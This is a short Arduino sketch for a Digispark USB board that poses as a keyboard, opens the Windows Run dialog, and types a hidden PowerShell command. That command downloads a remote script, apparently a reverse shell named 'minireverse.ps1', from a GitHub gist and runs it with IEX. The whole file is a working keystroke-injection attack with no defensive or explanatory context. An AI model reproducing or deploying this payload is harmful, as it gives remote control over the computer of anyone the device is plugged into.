#include "DigiKeyboard.h"
void setup() {
}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell -W Hidden \"IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/zetta0/1bc28897a5a9b2a87768956535ff2f0d/raw/3cf790c1dbd661076cdd532c30fdddacf13d3668/minireverse.ps1');\"");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  for (;;) {
    /*Stops the digispark from running the scipt again*/
  }
}
